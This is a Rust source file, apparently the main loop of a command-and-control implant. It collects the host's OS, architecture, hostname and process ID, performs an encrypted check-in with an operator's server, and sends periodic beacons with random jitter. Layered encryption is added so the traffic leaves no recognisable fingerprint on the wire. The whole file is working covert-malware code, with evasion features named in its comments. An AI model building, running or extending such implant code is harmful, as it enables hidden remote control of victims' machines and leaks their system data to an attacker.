use glimmer::c2::http::HTTPChannel;
use glimmer::c2::{Channel, SendContext};
use glimmer::cfg::Config;
use glimmer::crypto::{self, TimeBasedKey};
use glimmer::identity;
use glimmer::proto::{CheckinData, Envelope, MsgType};

fn main() {
    let config = match Config::load("config.json") {
        Ok(c) => c,
        Err(_e) => {
            glimmer::dbg_log!("[dev] config: {}", _e);
            std::process::exit(1);
        }
    };

    let node_id = identity::generate();

    let server_pub = match config.server_public_key_bytes() {
        Ok(k) => k,
        Err(_e) => {
            glimmer::dbg_log!("[dev] invalid server public key: {}", _e);
            std::process::exit(1);
        }
    };

    let channel = match HTTPChannel::new(config.endpoints().to_vec()) {
        Ok(c) => c,
        Err(_e) => {
            glimmer::dbg_log!("[dev] channel init failed: {}", _e);
            std::process::exit(1);
        }
    };

    glimmer::dbg_log!(
        "[dev] channel: {} (stealth={}, max={})",
        channel.info().name,
        channel.info().stealth,
        channel.info().max_payload
    );

    // Phase 1: Bootstrap with full ephemeral ECDH
    let checkin = CheckinData {
        os: std::env::consts::OS.into(),
        arch: std::env::consts::ARCH.into(),
        host: hostname(),
        pid: std::process::id(),
        pub_key: vec![],
    };

    let time_key = match bootstrap(&node_id, &checkin, &server_pub, &channel) {
        Ok(tk) => {
            glimmer::dbg_log!("[dev] bootstrap complete, time-based key established");
            tk
        }
        Err(_e) => {
            glimmer::dbg_log!("[dev] bootstrap failed: {}", _e);
            std::process::exit(1);
        }
    };

    // Phase 2: Layered encryption - time-based outer, ECIES inner
    loop {
        match send_layered(
            MsgType::Beacon,
            &node_id,
            None::<&()>,
            &time_key,
            &server_pub,
            &channel,
        ) {
            Ok(_) => { glimmer::dbg_log!("[dev] beacon sent [layered]"); },
            Err(_e) => { glimmer::dbg_log!("[dev] beacon failed: {}", _e); },
        }

        sleep(config.beacon_interval(), config.jitter());
    }
}

/// Phase 1: Bootstrap checkin with full ephemeral ECDH.
/// Establishes the time-based root secret for the outer encryption layer.
fn bootstrap(
    node_id: &str,
    checkin: &CheckinData,
    server_pub: &[u8],
    channel: &dyn Channel,
) -> Result<TimeBasedKey, Box<dyn std::error::Error>> {
    let envelope = Envelope::with_data(MsgType::Checkin, node_id, checkin)?;
    let serialized = envelope.marshal()?;

    let (encrypted, _response_kp, root_secret) =
        crypto::bootstrap_encrypt(&serialized, server_pub)?;

    let ctx = SendContext::new(server_pub, node_id, encrypted);
    let _response = channel.send(&ctx)?;

    // 300 second time buckets
    Ok(TimeBasedKey::new(root_secret, 300))
}

/// Phase 2: Layered encryption.
/// Inner: ECIES with per-message ephemeral key - only server can decrypt.
/// Outer: Time-based key - hides the EC fingerprint on the wire.
fn send_layered<T: serde::Serialize>(
    msg_type: MsgType,
    node_id: &str,
    payload: Option<&T>,
    time_key: &TimeBasedKey,
    server_pub: &[u8],
    channel: &dyn Channel,
) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
    let envelope = match payload {
        Some(data) => Envelope::with_data(msg_type, node_id, data)?,
        None => Envelope::new(msg_type, node_id, None),
    };

    let serialized = envelope.marshal()?;

    // Inner layer: per-message ephemeral ECDH, only server can decrypt
    let inner = crypto::encrypt_for_server(&serialized, server_pub)?;

    // Outer layer: time-based, zero fingerprint on wire
    let outer = time_key.encrypt(&inner)?;

    let ctx = SendContext::new(server_pub, node_id, outer);
    channel.send(&ctx)
}

fn sleep(base: std::time::Duration, jitter: f64) {
    let random: f64 = rand::random();
    let j = base.mul_f64(jitter * random);
    std::thread::sleep(base + j);
}

fn hostname() -> String {
    glimmer::sys::read_file_string("/etc/hostname")
        .unwrap_or_else(|_| "unknown".into())
}